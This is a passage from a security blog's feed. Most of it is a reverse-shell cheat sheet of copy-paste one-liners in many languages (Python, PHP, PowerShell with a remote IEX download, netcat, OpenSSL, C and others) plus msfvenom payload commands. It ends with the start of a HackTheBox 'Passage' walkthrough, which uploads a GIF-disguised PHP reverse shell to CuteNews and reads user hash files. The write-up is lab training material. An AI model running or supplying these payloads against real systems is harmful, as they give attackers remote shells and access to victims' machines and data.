&#39;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;10.0.0.1&quot;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#39;python -c &#39;a=__import__;b=a(&quot;socket&quot;).socket;p=a(&quot;subprocess&quot;).call;o=a(&quot;os&quot;).dup2;s=b();s.connect((&quot;10.0.0.1&quot;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39;python -c &#39;a=__import__;b=a(&quot;socket&quot;).socket;c=a(&quot;subprocess&quot;).call;s=b();s.connect((&quot;10.0.0.1&quot;,4242));f=s.fileno;c([&quot;/bin/sh&quot;,&quot;-i&quot;],stdin=f(),stdout=f(),stderr=f())&#39;</code></pre><p>IPv6</p><pre><code>python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre><p>IPv6 (No Spaces)</p><pre><code>python -c &#39;socket=__import__(&quot;socket&quot;);os=__import__(&quot;os&quot;);pty=__import__(&quot;pty&quot;);s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre><p>IPv6 (No Spaces, Shortened)</p><pre><code>python -c &#39;a=__import__;c=a(&quot;socket&quot;);o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#39;</code></pre><p>Windows only</p><pre><code>C:\Python27\python.exe -c &quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;10.0.0.1&#39;, 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), &#123;&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])&#125;)(), type(&#39;try&#39;, (), &#123;&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]&#125;)())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])(&#123;&#125;), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])(&#123;&#125;), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&quot;</code></pre><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><pre><code>php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39;php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);passthru(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#39;php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;</code></pre><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><pre><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,4242).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;ruby -rsocket -e&#39;exit if fork;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4242&quot;);loop&#123;c.gets.chomp!;(exit! if $_==&quot;exit&quot;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r)&#123;|io|c.print io.read&#125;))rescue c.puts &quot;failed: #&#123;$_&#125;&quot;&#125;&#39;NOTE: Windows onlyruby -rsocket -e &#39;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4242&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</code></pre><h3 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h3><pre><code>echo &#39;package main;import&quot;os/exec&quot;;import&quot;net&quot;;func main()&#123;c,_:=net.Dial(&quot;tcp&quot;,&quot;10.0.0.1:4242&quot;);cmd:=exec.Command(&quot;/bin/sh&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;&#39; &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go</code></pre><h3 id="Netcat-Traditional"><a href="#Netcat-Traditional" class="headerlink" title="Netcat Traditional"></a>Netcat Traditional</h3><pre><code>nc -e /bin/sh 10.0.0.1 4242nc -e /bin/bash 10.0.0.1 4242nc -c bash 10.0.0.1 4242</code></pre><h3 id="Netcat-OpenBsd"><a href="#Netcat-OpenBsd" class="headerlink" title="Netcat OpenBsd"></a>Netcat OpenBsd</h3><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f</code></pre><h3 id="Netcat-BusyBox"><a href="#Netcat-BusyBox" class="headerlink" title="Netcat BusyBox"></a>Netcat BusyBox</h3><pre><code>rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f</code></pre><h3 id="Ncat"><a href="#Ncat" class="headerlink" title="Ncat"></a>Ncat</h3><pre><code>ncat 10.0.0.1 4242 -e /bin/bashncat --udp 10.0.0.1 4242 -e /bin/bash</code></pre><h3 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h3><p>Attacker:</p><pre><code>mdn1nj4@attacker$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodesmdn1nj4@attacker$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242ormdn1nj4@attacker$ ncat --ssl -vv -l -p 4242mdn1nj4@victim$ mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 10.0.0.1:4242 &gt; /tmp/s; rm /tmp/s</code></pre><p>TLS-PSK (does not rely on PKI or self-signed certificates)</p><pre><code># generate 384-bit PSK# use the generated string as a value for the two PSK variables from belowopenssl rand -hex 48 # server (attacker)export LHOST=&quot;*&quot;; export LPORT=&quot;4242&quot;; export PSK=&quot;replacewithgeneratedpskfromabove&quot;; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT# client (victim)export RHOST=&quot;10.0.0.1&quot;; export RPORT=&quot;4242&quot;; export PSK=&quot;replacewithgeneratedpskfromabove&quot;; export PIPE=&quot;/tmp/`openssl rand -hex 4`&quot;; mkfifo $PIPE; /bin/sh -i &lt; $PIPE 2&gt;&amp;1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT &gt; $PIPE; rm $PIPE</code></pre><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;10.0.0.1&quot;,4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.0.0.1&#39;,4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#39;)</code></pre><h3 id="Awk"><a href="#Awk" class="headerlink" title="Awk"></a>Awk</h3><pre><code>awk &#39;BEGIN &#123;s = &quot;/inet/tcp/0/10.0.0.1/4242&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&#39; /dev/null</code></pre><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><pre><code>Runtime r = Runtime.getRuntime();Process p = r.exec(&quot;/bin/bash -c &#39;exec 5&lt;&gt;/dev/tcp/10.0.0.1/4242;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#39;&quot;);p.waitFor();</code></pre><h4 id="Java-Alternative-1"><a href="#Java-Alternative-1" class="headerlink" title="Java Alternative 1"></a>Java Alternative 1</h4><pre><code>String host=&quot;127.0.0.1&quot;;int port=4444;String cmd=&quot;cmd.exe&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</code></pre><h4 id="Java-Alternative-2"><a href="#Java-Alternative-2" class="headerlink" title="Java Alternative 2"></a>Java Alternative 2</h4><p><strong>NOTE</strong>: This is more stealthy</p><pre><code>Thread thread = new Thread()&#123;    public void run()&#123;        // Reverse shell here    &#125;&#125;thread.start();</code></pre><h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><pre><code>In Attacker machine start two listeners:nc -lvp 8080nc -lvp 8081In Victime machine run below command:telnet &lt;Your_IP&gt; 8080 | /bin/sh | telnet &lt;Your_IP&gt; 8081</code></pre><h3 id="War"><a href="#War" class="headerlink" title="War"></a>War</h3><pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war &gt; reverse.warstrings reverse.war | grep jsp # in order to get the name of the file</code></pre><h3 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h3><p>Linux only</p><pre><code>lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;4242&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</code></pre><p>Windows and Linux</p><pre><code>lua5.1 -e &#39;local host, port = &quot;10.0.0.1&quot;, 4242 local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&#39;</code></pre><h3 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h3><pre><code>(function()&#123;    var net = require(&quot;net&quot;),        cp = require(&quot;child_process&quot;),        sh = cp.spawn(&quot;/bin/sh&quot;, []);    var client = new net.Socket();    client.connect(4242, &quot;10.0.0.1&quot;, function()&#123;        client.pipe(sh.stdin);        sh.stdout.pipe(client);        sh.stderr.pipe(client);    &#125;);    return /a/; // Prevents the Node.js application form crashing&#125;)();orrequire(&#39;child_process&#39;).exec(&#39;nc -e /bin/sh 10.0.0.1 4242&#39;)or-var x = global.process.mainModule.require-x(&#39;child_process&#39;).exec(&#39;nc 10.0.0.1 4242 -e /bin/bash&#39;)orhttps://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</code></pre><h3 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h3><p>by <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">frohoff</a> NOTE: Java reverse shell also work for Groovy</p><pre><code>String host=&quot;10.0.0.1&quot;;int port=4242;String cmd=&quot;cmd.exe&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</code></pre><h4 id="Groovy-Alternative-1"><a href="#Groovy-Alternative-1" class="headerlink" title="Groovy Alternative 1"></a>Groovy Alternative 1</h4><p><strong>NOTE</strong>: This is more stealthy</p><pre><code>Thread.start &#123;    // Reverse shell here&#125;</code></pre><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><p>Compile with <code>gcc /tmp/shell.c --output csh &amp;&amp; csh</code></p><pre><code>#include &lt;stdio.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;int main(void)&#123;    int port = 4242;    struct sockaddr_in revsockaddr;    int sockt = socket(AF_INET, SOCK_STREAM, 0);    revsockaddr.sin_family = AF_INET;           revsockaddr.sin_port = htons(port);    revsockaddr.sin_addr.s_addr = inet_addr(&quot;10.0.0.1&quot;);    connect(sockt, (struct sockaddr *) &amp;revsockaddr,     sizeof(revsockaddr));    dup2(sockt, 0);    dup2(sockt, 1);    dup2(sockt, 2);    char * const argv[] = &#123;&quot;/bin/sh&quot;, NULL&#125;;    execve(&quot;/bin/sh&quot;, argv, NULL);    return 0;       &#125;</code></pre><h3 id="Dart"><a href="#Dart" class="headerlink" title="Dart"></a>Dart</h3><pre><code>import &#39;dart:io&#39;;import &#39;dart:convert&#39;;main() &#123;  Socket.connect(&quot;10.0.0.1&quot;, 4242).then((socket) &#123;    socket.listen((data) &#123;      Process.start(&#39;powershell.exe&#39;, []).then((Process process) &#123;        process.stdin.writeln(new String.fromCharCodes(data).trim());        process.stdout          .transform(utf8.decoder)          .listen((output) &#123; socket.write(output); &#125;);      &#125;);    &#125;,    onDone: () &#123;      socket.destroy();    &#125;);  &#125;);&#125;</code></pre><h2 id="Meterpreter-Shell"><a href="#Meterpreter-Shell" class="headerlink" title="Meterpreter Shell"></a>Meterpreter Shell</h2><h3 id="Windows-Staged-reverse-TCP"><a href="#Windows-Staged-reverse-TCP" class="headerlink" title="Windows Staged reverse TCP"></a>Windows Staged reverse TCP</h3><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe &gt; reverse.exe</code></pre><h3 id="Windows-Stageless-reverse-TCP"><a href="#Windows-Stageless-reverse-TCP" class="headerlink" title="Windows Stageless reverse TCP"></a>Windows Stageless reverse TCP</h3><pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe &gt; reverse.exe</code></pre><h3 id="Linux-Staged-reverse-TCP"><a href="#Linux-Staged-reverse-TCP" class="headerlink" title="Linux Staged reverse TCP"></a>Linux Staged reverse TCP</h3><pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf &gt;reverse.elf</code></pre><h3 id="Linux-Stageless-reverse-TCP"><a href="#Linux-Stageless-reverse-TCP" class="headerlink" title="Linux Stageless reverse TCP"></a>Linux Stageless reverse TCP</h3><pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf &gt;reverse.elf</code></pre><h3 id="Other-platforms"><a href="#Other-platforms" class="headerlink" title="Other platforms"></a>Other platforms</h3><pre><code>$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&quot;10.0.0.1&quot; LPORT=4242 -f elf &gt; shell.elf$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=&quot;10.0.0.1&quot; LPORT=4242 -f exe &gt; shell.exe$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=&quot;10.0.0.1&quot; LPORT=4242 -f macho &gt; shell.macho$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=&quot;10.0.0.1&quot; LPORT=4242 -f asp &gt; shell.asp$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=&quot;10.0.0.1&quot; LPORT=4242 -f raw &gt; shell.jsp$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=&quot;10.0.0.1&quot; LPORT=4242 -f war &gt; shell.war$ msfvenom -p cmd/unix/reverse_python LHOST=&quot;10.0.0.1&quot; LPORT=4242 -f raw &gt; shell.py$ msfvenom -p cmd/unix/reverse_bash LHOST=&quot;10.0.0.1&quot; LPORT=4242 -f raw &gt; shell.sh$ msfvenom -p cmd/unix/reverse_perl LHOST=&quot;10.0.0.1&quot; LPORT=4242 -f raw &gt; shell.pl$ msfvenom -p php/meterpreter_reverse_tcp LHOST=&quot;10.0.0.1&quot; LPORT=4242 -f raw &gt; shell.php; cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></pre>]]></content>
    
    
    <summary type="html">Each of the methods below is aimed to be a one-liner that you can copy/paste. As such they’re quite short lines, but not very readable.</summary>
    
    
    
    <category term="Tips" scheme="https://mdn1nj4.github.io/categories/Tips/"/>
    
    
    <category term="shell" scheme="https://mdn1nj4.github.io/tags/shell/"/>
    
    <category term="payloads" scheme="https://mdn1nj4.github.io/tags/payloads/"/>
    
    <category term="reverse shell" scheme="https://mdn1nj4.github.io/tags/reverse-shell/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox - Passage Writeup</title>
    <link href="https://mdn1nj4.github.io/htb/hackthebox-passage-writeup/"/>
    <id>https://mdn1nj4.github.io/htb/hackthebox-passage-writeup/</id>
    <published>2021-09-12T05:38:00.000Z</published>
    <updated>2025-05-08T07:31:28.260Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a><strong>Introduction</strong></h1><p>Passage is medium level machine, Enumuration is the key for this box. First we have to exploit the cutenews Web application to Get the initial reverse shell after that i found the bunch of php files which contains the user information with base64 format then we get the hash for the user paul and decrypt the hash and i login to to user paul. The user paul and nadav share the  ssh keys so i copied the ssh key and Get access to the user nadav after that i found the nadav user in sudo group and .vim info reveal the usefull imformation for getting root this machine  In order to root this machine i used the USBCreator D-Bus Privilege Escalation.</p><blockquote><p>Skills Required : Enumuration, Basic linux command<br>Skills Learned : web Exploitaion, USBCreator D-Bus Privilege Escalation</p></blockquote><h1 id="Enumuration"><a href="#Enumuration" class="headerlink" title="Enumuration"></a><strong>Enumuration</strong></h1><h4 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a><strong>Nmap scan</strong></h4><p>the nmap scan show there is 2 port open</p><ol><li><p>22 ssh</p></li><li><p>80 http</p><p> #nmap -sV -sC -oN scan-tcp.nmap 10.10.10.206<br> Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-03-18 17:32 GMT<br> Nmap scan report for 10.10.10.206<br> Host is up (0.040s latency).<br> Not shown: 998 closed ports<br> PORT   STATE SERVICE VERSION<br> 22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br> | ssh-hostkey:<br> |   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)<br> |   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)<br> |_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)<br> 80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br> |_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)<br> |_http-title: Passage News<br> Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p><p> Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br> Nmap done: 1 IP address (1 host up) scanned in 22.31 seconds</p></li></ol><p>so the machine run the apache web server. I opened the web page in my browser</p><h1 id="CuteNews"><a href="#CuteNews" class="headerlink" title="CuteNews"></a><strong>CuteNews</strong></h1><p>web page show the host name and give me the 2 Email address<br>admin   : <a href="mailto:&#x6e;&#x61;&#100;&#x61;&#x76;&#x40;&#x70;&#x61;&#115;&#x73;&#97;&#x67;&#101;&#46;&#x68;&#116;&#x62;">&#x6e;&#x61;&#100;&#x61;&#x76;&#x40;&#x70;&#x61;&#115;&#x73;&#97;&#x67;&#101;&#46;&#x68;&#116;&#x62;</a><br>paul Colas  : <a href="mailto:&#x70;&#97;&#117;&#x6c;&#64;&#x70;&#97;&#115;&#x73;&#x61;&#103;&#101;&#46;&#x68;&#116;&#98;">&#x70;&#97;&#117;&#x6c;&#64;&#x70;&#97;&#115;&#x73;&#x61;&#103;&#101;&#46;&#x68;&#116;&#98;</a></p><p>I add the passage.htb on my &#x2F;etc&#x2F;hosts file.<br>and the page reveals website is powered by Cutenews after searching on the internet i found the cutenews is the news management based on flat files as a storage.</p><p>so after that i searched on the internet for any Exploit available for cutenews ad i looked the page source code i found some interesting information</p><pre><code># Source Page Code &lt;link href=&quot;CuteNews/libs/css/cosmo.min.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;CuteNews/libs/css/font-awesome.min.css&quot; rel=&quot;stylesheet&quot;&gt;</code></pre><p>After that i go the directory Cutenews and i found the login page of the cutenews</p><blockquote><p><a href="https://10.10.10.206/CuteNews">https://10.10.10.206/CuteNews</a>  </p></blockquote><p>the login page of the Cutenews show the version of the cutenews is 2.1.2</p><h1 id="CuteNews-2-1-2-Remote-Code-Execution"><a href="#CuteNews-2-1-2-Remote-Code-Execution" class="headerlink" title="CuteNews 2.1.2 - Remote Code Execution"></a><strong>CuteNews 2.1.2 - Remote Code Execution</strong></h1><p>so i check for the exploit in exploitdb using the command searchsploit</p><blockquote><p>user@home:~$ searchsploit cutenews 2.1.2</p></blockquote><pre><code>#searchsploit cutenews 2.1.2----------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                       |  Path----------------------------------------------------------------------------------------------------- ---------------------------------CuteNews 2.1.2 - &#39;avatar&#39; Remote Code Execution (Metasploit)                                         | php/remote/46698.rbCuteNews 2.1.2 - Arbitrary File Deletion                                                             | php/webapps/48447.txtCuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                 | php/webapps/48458.txtCuteNews 2.1.2 - Remote Code Execution                                                               | php/webapps/48800.py----------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results</code></pre><blockquote><p>user@home:~$ searchsploit -m php&#x2F;webapps&#x2F;48800.py</p></blockquote><p>if you want to run that script its ok but i have to exploit the cutenews manually.</p><p>Its simple 3 step process.</p><ol><li>create a user</li></ol><blockquote><p>Register Form  </p></blockquote><ol><li>then click on the personal options</li><li>scroll down you see the upload avatar upload the shell.php</li></ol><blockquote><p>user@home:~$ vim shell.php</p></blockquote><pre><code>GIF8;&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/YOURIP/1234 0&gt;&amp;1&#39;&quot;) ?&gt;</code></pre><p>save the file and upload.<br>before open the avatar image you need to create a listener on port 1234 with nc commmand</p><blockquote><p>user@home:~$ nc -lvvnkp 1234 open the avatar image in the browser and i got that shell!</p></blockquote><pre><code>#nc -lvvnkp 1234listening on [any] 1234 ...connect to [10.10.14.xx] from (UNKNOWN) [10.10.10.206] 37080bash: cannot set terminal process group (1635): Inappropriate ioctl for devicebash: no job control in this shellwww-data@passage:/var/www/html/CuteNews/uploads$ id    iduid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@passage:/var/www/html/CuteNews/uploads$ </code></pre><h1 id="Getting-User-Paul"><a href="#Getting-User-Paul" class="headerlink" title="Getting User Paul"></a><strong>Getting User Paul</strong></h1><p>after some enumuration i found the directory which contains the user information and password hash in base64 format</p><pre><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ lsls01.php09.php0a.php16.php21.php2a.php32.php52.php5d.php62.php66.php6e.php77.php7a.php81.php8f.php97.phpa5.phpb0.phpb1.phpc8.phpd2.phpd4.phpd5.phpd6.phpe0.phpf3.phpfc.phplinesusers.txt</code></pre><blockquote><p>cat 09.php</p></blockquote><pre><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ cat 09.phpcat 09.php&lt;?php die(&#39;Direct call - access denied&#39;); ?&gt;YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319</code></pre><p>Decode the base64</p><blockquote><p>echo base64_text | base64 -d</p></blockquote><pre><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ echo &quot;YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319&quot; | base64 -d&lt;Fzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319&quot; | base64 -d                     